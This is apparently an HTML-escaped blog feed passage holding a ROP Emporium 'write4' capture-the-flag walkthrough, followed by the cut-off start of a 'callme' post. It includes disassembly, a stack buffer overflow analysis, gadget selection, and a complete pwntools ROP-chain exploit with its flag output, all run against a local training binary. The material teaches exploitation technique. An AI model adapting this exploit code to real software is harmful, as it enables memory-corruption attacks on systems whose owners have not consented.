   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000093b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;145&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x730&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000940&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;150&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000941&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;151&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;leave&lt;/span&gt;  
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000942&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;152&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Therefore the next interesting function is &lt;strong&gt;read&lt;/strong&gt; function, which reads for user input and stores in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#06b6ef&#34;&gt;read&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;buf, size_t count);  &lt;span style=&#34;color:#776e71&#34;&gt;// read(0,[rbp-0x20], 0x200)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the vulnerability,we can exploit it in order to abuse the control flow of the program through controlling the value of the return address.&lt;/p&gt;
&lt;p&gt;From the authors hint , we need to look for an ELF section that is writable in order to write our string.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Perhaps the most important thing to consider in this challenge is where we&amp;rsquo;re going to write our &amp;ldquo;flag.txt&amp;rdquo; string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose.
Opening the binary in radare2, we can check the permissions of different sections using the command &lt;strong&gt;iS&lt;/strong&gt; as in the image above.
&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/write4_where.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/write4_where.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From the above we are able to determine the data and bss section is both readable and writable. Our target for the ropchain is to write our string to the &lt;strong&gt;bss&lt;/strong&gt; section. Therefore we need to get memory address of &lt;strong&gt;.bss&lt;/strong&gt; area.&lt;/p&gt;
&lt;p&gt;From the authors challenge hint, we need to disassemble usefulFunction to understand how it works.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &amp;ldquo;flag.txt&amp;rdquo;) as the 1st argument.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From the disassembly of the binary, we have an interesting function called usefulFunction. The function is responsible for calling &lt;strong&gt;print_file&lt;/strong&gt; function as hinted by the author.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/write4_useful.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/write4_useful.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the analysis of the above function, we can determine we are passing a string file name called  &lt;strong&gt;&amp;ldquo;nonexistent&amp;rdquo;&lt;/strong&gt; to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest &lt;strong&gt;flag.txt&lt;/strong&gt; to the  the print_file function.&lt;/p&gt;
&lt;p&gt;From the disassembly of the binary we have another interesting function called &lt;strong&gt;usefulGadgets&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;usefulGadgets&lt;/span&gt; 
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;usefulGadgets&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400628&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;],&lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040062b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040062c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;]
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The gadget from the above disassembled code will enable us to write content in r15 register to memory address [r14]. Next step is to look for gadgets that will enable us to control both the &lt;strong&gt;r14&lt;/strong&gt; and &lt;strong&gt;r15&lt;/strong&gt; register values.&lt;/p&gt;
&lt;p&gt;For building our ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly &lt;strong&gt;pop&lt;/strong&gt; instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both r14 and r15.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0040068f&lt;/span&gt;                 &lt;span style=&#34;color:#f99b15&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;d&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt; rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400690&lt;/span&gt;               &lt;span style=&#34;color:#f99b15&#34;&gt;415&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;e&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400692&lt;/span&gt;               &lt;span style=&#34;color:#f99b15&#34;&gt;415&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400694&lt;/span&gt;                 &lt;span style=&#34;color:#ef6155&#34;&gt;c3&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Example of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we dont need the rbp register, for our ropchain, we take the address pointed py pop14 &lt;strong&gt;0x00400690&lt;/strong&gt; . This is possible because rop gadgets are set of instructions that end with &lt;strong&gt;ret&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;From the disassembly of usedfulgadgets function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of &lt;strong&gt;.bss&lt;/strong&gt; section of ELF and r15 register to be the value we want to write to the &lt;strong&gt;.bss&lt;/strong&gt; section.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hopefully you&amp;rsquo;ve realised that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won&amp;rsquo;t be using built-in functionality since that&amp;rsquo;s too similar to the previous challenges, instead we&amp;rsquo;ll be looking for gadgets that let us write a value to memory such as mov [reg], reg.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400628&lt;/span&gt;             &lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;d893e&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;qword&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;], &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0040062b&lt;/span&gt;                 &lt;span style=&#34;color:#ef6155&#34;&gt;c3&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Therefore, the two gadgets that will enable us to set the register values of r14 and r15 and copy the values of r15 to the memory region defined by r14.&lt;/p&gt;
&lt;p&gt;Last is a find a gadget that will aid passing of an argument to the print_file function. Because the function takes one oner argument as a parameter, we look for a pop rdi ret instruction&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400693&lt;/span&gt;                 &lt;span style=&#34;color:#f99b15&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt; rdi
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00400694&lt;/span&gt;                 &lt;span style=&#34;color:#ef6155&#34;&gt;c3&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the &lt;strong&gt;flag.txt&lt;/strong&gt; and display output to the console.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;A fully working ropchain exploit of the challenge is,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pwn&lt;/span&gt;

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt;
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
io &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./write4&amp;#39;&lt;/span&gt;)

bss_area &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00601038&lt;/span&gt;)
pop_r14_r15 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00400690&lt;/span&gt;)
pop_rdi &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00400693&lt;/span&gt;)
mov_r14_r15 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00400628&lt;/span&gt;)
print_file_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0000000000400510&lt;/span&gt;)

payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;#fill the buffer&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#776e71&#34;&gt;#overwrite the base pointer&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pop_r14_r15
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; bss_area
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flag.txt&amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; mov_r14_r15
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pop_rdi
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; bss_area
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; print_file_addr

io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;recvall()&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Successful execution of our exploit above we get a correct flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:write4$ python3 x.py 
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./write4&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#f99b15&#34;&gt;7275&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Receiving all data: Done &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;45B&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Process &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./write4&amp;#39;&lt;/span&gt; stopped with exit code -11 &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;SIGSEGV&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;pid 7275&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;  Thank you!
    ROPE&lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Return-Oriented Programming - Callme</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-callme/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:43 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-callme/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/ropemporium/callme.jpg" alt="Featured image of post Return-Oriented Programming - Callme" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Challenge Description&lt;/p&gt;
&lt;p&gt;The goal of this challenge is to understand how  more than one argument is  passed in x64 function. The challenge can be downloaded from the authors website &lt;a class=&#34;link&#34; href=&#34;https://ropemporium.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ropemporium&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Reliably make consecutive calls to imported functions.
Use some new techniques and learn about the Procedure Linkage Table.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First we check the binary protections enabled on the callme binary, only &lt;strong&gt;NX&lt;/strong&gt;( Not Executable) is enabled on the binary as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:callme$ checksec --file callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
    RUNPATH:  b&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Open the &lt;strong&gt;callme&lt;/strong&gt; binary in radare2 to look for exploitable vulnerability and examine the behavior of the binary. radare2 is a powerful disassembler/debugging tool in Linux, used for examining the  behavior of programs.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/callme_bug.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/callme_bug.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the above image we use &lt;strong&gt;pdf&lt;/strong&gt; command in to do disassembly at a given function. From the image above, the function &lt;strong&gt;pwnme&lt;/strong&gt; looks similar to the previous challenges ret2win and split.&lt;/p&gt;
&lt;p&gt;From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.
&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Therefore the next function is read function, which reads for user input and stores in the specified buffer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#06b6ef&#34;&gt;read&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;buf, size_t count);
